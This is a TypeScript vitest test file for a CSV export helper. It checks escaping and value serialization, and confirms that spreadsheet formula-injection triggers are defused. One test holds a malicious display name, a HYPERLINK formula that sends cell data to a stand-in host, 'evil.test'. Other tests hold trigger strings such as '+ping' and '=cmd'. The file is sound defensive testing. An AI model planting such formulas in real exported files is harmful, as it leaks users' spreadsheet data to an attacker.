import { describe, expect, it } from 'vitest';

import { toCsv } from './csv.ts';

describe('toCsv', () => {
  it('joins headers and rows with commas and newlines', () => {
    const csv = toCsv(
      ['a', 'b'],
      [
        [1, 2],
        [3, 4],
      ],
    );
    expect(csv).toBe('a,b\n1,2\n3,4');
  });

  it('escapes fields containing commas, quotes, or newlines', () => {
    const csv = toCsv(['name'], [['Doe, John'], ['say "hi"'], ['line1\nline2']]);
    expect(csv).toBe('name\n"Doe, John"\n"say ""hi"""\n"line1\nline2"');
  });

  it('renders null/undefined as empty cells', () => {
    expect(toCsv(['x'], [[null], [undefined]])).toBe('x\n\n');
  });

  it('serializes number, boolean, and bigint cells as plain values', () => {
    // Exercises the typeof number/boolean/bigint branch (a bigint would throw
    // under JSON.stringify, so this also pins the String() coercion).
    expect(toCsv(['n', 'b', 'big'], [[42, true, 10n]])).toBe('n,b,big\n42,true,10');
  });

  it('serializes an object cell as quoted JSON (the non-primitive branch)', () => {
    expect(toCsv(['x'], [[{ a: 1 }]])).toBe('x\n"{""a"":1}"');
  });

  it('neutralizes formula-injection triggers (=, +, -, @) with a leading quote', () => {
    const csv = toCsv(
      ['name'],
      [['=1+1'], ['+ping'], ['-2+3'], ['@SUM(A1)'], ['safe name']],
    );
    expect(csv).toBe("name\n'=1+1\n'+ping\n'-2+3\n'@SUM(A1)\nsafe name");
  });

  it('neutralizes a formula that ALSO needs quoting (HYPERLINK exfil)', () => {
    // A malicious member display name: must be both formula-defused and
    // CSV-quoted (it contains commas + quotes).
    const evil = '=HYPERLINK("http://evil.test?x="&A1,"click")';
    const csv = toCsv(['name'], [[evil]]);
    expect(csv).toBe(`name\n"'=HYPERLINK(""http://evil.test?x=""&A1,""click"")"`);
  });

  it('neutralizes a leading tab / carriage-return trigger', () => {
    // Tab/CR aren't quote-triggers, so the field stays unquoted — but the
    // apostrophe still defuses the formula.
    expect(toCsv(['x'], [['\t=cmd'], ['\r=cmd']])).toBe("x\n'\t=cmd\n'\r=cmd");
  });
});
